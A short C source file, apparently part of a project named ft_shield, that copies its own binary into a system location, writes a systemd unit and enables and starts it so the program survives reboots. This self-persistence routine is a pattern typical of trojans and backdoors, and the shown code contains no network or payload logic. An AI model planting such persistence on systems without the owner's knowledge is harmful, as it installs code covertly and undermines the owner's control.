#include "ft_shield.h"

static bool already_installed(void) {
	struct stat st;
	
	if (stat(BIN_FILE, &st) == 0) {
		return (true);
	}

	if (stat(SYS_FILE, &st) == 0) {
		return (true);
	}

	return (false);
}

static void cp_bin(void)
{
	int fd_src = open(FT_SHIELD, O_RDONLY);
	if (fd_src < 0)
		return;

	int fd_dst = open(BIN_FILE, O_WRONLY | O_CREAT | O_TRUNC, 0755);
	if (fd_dst < 0)
		return;

	char buff[BUFFER_SIZE];
	int bytes = 0;

	while ((bytes = read(fd_src, buff, BUFFER_SIZE)) > 0)
	{
		write(fd_dst, buff, bytes);
	}

	close(fd_src);
	close(fd_dst);
}

void systemd(void)
{
	if (already_installed()) {
		return ;
	}

	cp_bin();
	int fd = open(SYS_FILE, O_WRONLY | O_CREAT | O_TRUNC, 0644);
	if (fd < 0)
		return;
	write(fd, SYSTEMD_OPT, strlen(SYSTEMD_OPT));
	close(fd);

	system("systemctl daemon-reload");
	system("systemctl enable ft_shield.service");
	system("systemctl start ft_shield.service");
}
